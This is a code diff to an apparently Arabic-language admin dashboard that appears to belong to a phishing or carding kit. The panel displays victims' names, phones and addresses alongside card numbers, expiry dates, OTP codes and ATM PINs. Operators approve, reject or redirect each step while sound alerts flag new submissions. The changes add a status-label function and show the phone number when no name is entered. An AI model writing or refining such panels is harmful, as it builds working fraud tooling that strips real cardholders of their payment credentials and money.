@@ -263,6 +263,15 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 <script>
 var PL={pending:'قيد الانتظار',awaiting:'بانتظار الموافقة',stepok:'تم القبول',
   confirmed:'مكتمل',rejected:'مرفوض',redirect:'إعادة توجيه'};
+function statusLabel(o){
+  if(o.status==='confirmed') return 'مكتمل';
+  if(o.status==='rejected') return 'مرفوض';
+  if(o.status==='redirect') return 'إعادة توجيه';
+  if(o.step==='pin') return 'ATM قيد الانتظار';
+  if(o.step==='otp') return 'OTP قيد الانتظار';
+  if(o.step==='card') return 'بطاقة قيد الانتظار';
+  return 'بيانات جديدة';
+}
 var PC={pending:'#f59e0b',awaiting:'#7c3aed',stepok:'#3b82f6',confirmed:'#16a34a',rejected:'#dc2626',redirect:'#0ea5e9'};
 var STEPS={card:'بطاقة الدفع',otp:'رمز التحقق',pin:'الرقم السري'};
 var STEPC={card:'#0ea5e9',otp:'#f59e0b',pin:'#a855f7'};
@@ -360,7 +369,7 @@ function renderActive(){
     var pay=o.pay||{};
     var otp=pay.otp?'<span class="otp">OTP: '+esc(pay.otp)+'</span>':'';
     return '<div class="ac'+(o.ref===selRef?' sel':'')+'" onclick="selectOrder(\''+esc(o.ref)+'\')">'+
-      '<div class="ac-t"><span class="ac-n">'+(esc(o.n)||'مجهول')+'</span>'+badge+'</div>'+
+      '<div class="ac-t"><span class="ac-n">'+(esc(o.n)||esc(o.p)||'—')+'</span>'+badge+'</div>'+
       '<div class="ac-info">'+(o.p?'<span>📱 '+esc(o.p)+'</span>':'')+otp+'</div></div>';
   }).join('');
 }
@@ -376,7 +385,7 @@ function renderOrders(){
     var pay=o.pay||{};
     var stepInfo=o.step?'<div class="oc-otp">📲 '+(STEPS[o.step]||o.step)+(pay.otp?' • OTP: '+esc(pay.otp):'')+'</div>':'';
     return '<div class="oc'+(o.ref===selRef?' sel':'')+'" onclick="selectOrder(\''+esc(o.ref)+'\')">'+
-      '<div class="oc-t"><div class="oc-nm"><span>'+(esc(o.n)||'مجهول')+'</span></div>'+statusBadge(o.status)+'</div>'+
+      '<div class="oc-t"><div class="oc-nm"><span>'+(esc(o.n)||esc(o.p)||'—')+'</span></div>'+statusBadge(o.status)+'</div>'+
       '<div class="oc-info">📱 '+(esc(o.p)||'—')+' • 🕐 '+fmtDate(o.ts)+' • '+esc(o.ref)+'</div>'+
       stepInfo+
       '<button class="oc-del '+(isDC?'confirm':'normal')+'" onclick="event.stopPropagation();oDel(\''+esc(o.ref)+'\')">'+(isDC?'⚠️ تأكيد':'✕')+'</button></div>';
@@ -403,7 +412,7 @@ function renderDetail(o){
   var h='';
 
   h+='<div class="dh"><div class="dh-left"><div class="dh-av">👤</div><div>'+
-    '<div class="dh-name">'+(esc(o.n)||'مجهول')+'</div>'+
+    '<div class="dh-name">'+(esc(o.n)||esc(o.p)||'—')+'</div>'+
     '<div class="dh-meta">'+statusBadge(o.status)+' '+(o.step?stepBadge(o.step):'')+
     '<span class="dh-time">🕐 '+fmtDate(o.ts)+'</span></div></div></div>'+
     '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+esc(o.ref)+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';
@@ -430,7 +439,7 @@ function renderDetail(o){
     {icon:'📍',label:'العنوان',value:o.ad},
     {icon:'💳',label:'نوع البطاقة',value:o.card},
     {icon:'🏛️',label:'النوع',value:o.st==='resident'?'مقيم':o.st==='citizen'?'مواطن':''},
-    {icon:'📊',label:'الحالة',value:PL[o.status]||o.status},
+    {icon:'📊',label:'الحالة',value:statusLabel(o)},
     {icon:'👤',label:'اسم حامل البطاقة',value:pay.cardName},
     {icon:'💳',label:'رقم البطاقة',value:pay.cardNumber,hl:true},
     {icon:'📅',label:'تاريخ الانتهاء',value:pay.exp},
@@ -535,7 +544,7 @@ function loadOrders(){
     var nw=r.orders||[];
     var nrefs=new Set(nw.map(function(o){return o.ref;}));
     if(prevRefs.size>0){var fresh=nw.filter(function(o){return!prevRefs.has(o.ref);});
-      if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].n||'مجهول'));}}
+      if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].n||fresh[0].p||'—'));}}
     prevRefs=nrefs;orders=nw;onlineCount=r.active||0;totalVisitors=r.totalVisitors||0;visitorPages=r.pages||[];
     renderStats();renderActive();renderOrders();
     if(selRef){var o=orders.find(function(x){return x.ref===selRef;});if(o)renderDetail(o);else closeDetail();}
